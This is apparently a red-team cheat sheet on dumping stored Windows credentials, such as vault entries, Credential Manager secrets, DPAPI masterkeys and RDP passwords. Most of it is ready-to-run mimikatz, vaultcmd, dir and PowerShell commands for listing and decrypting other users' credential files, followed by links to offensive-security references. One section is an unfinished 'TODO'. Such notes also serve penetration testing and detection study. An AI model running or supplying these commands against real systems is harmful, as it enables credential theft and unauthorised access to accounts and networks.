# Living off the Land

## 01 - Types of credentials to dump

Various credentials will be harvested and they are:
- Web browsers
- Emails
- Video Conferences
- Wi-Fi credentials
- Certificates
- RDP passwords
- etc

## 02 - View Credentials

```
mimikatz # vault::cred
```

## 02 - List Vault

```
C:\> vaultcmd /listcreds:"Windows Credentials" /all

mimikatz # vault::list
```

## 03 - List Credentials Manager

```
mimikatz # sekurlsa::credman
```

## 04 - List Cached Masterkeys

```
mimikatz # sekurlsa::dpapi
```

## 05 - List Credential Files

TODO: Fill this info

```
C:\> dir /a:h C:\Users\%username%\AppData\Local\Microsoft\Credentials

C:\> dir /a:h C:\Users\%username%\AppData\Roaming\Microsoft\Credentials

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

```
C:\> dir C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SUID>\<GUID>
```

```
mimikatz # dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\ /master-key:
```

---
## References

### Hacktricks

- [HackTricks: DPAPI - Extracting Passwords](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)

### InternalAllTheThings

- [InternalAllTheThings: Windows - DPAPI](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-dpapi)

### Hacking Articles

- [Hacking Articles: Windows Credential Manager](https://www.hackingarticles.in/credential-dumping-windows-credential-manager/)

### The Hacker Recipes

- [The Hacker Recipes: DPAPI Protected Secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)

- [The Hacker Recipes: Cred](https://tools.thehacker.recipes/mimikatz/modules/vault/cred)

- [The Hacker Recipes: Vault](https://tools.thehacker.recipes/mimikatz/modules/vault/list)

### Pentestlab

- [Pentestlab Blog: Dumping RDP Credentials](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)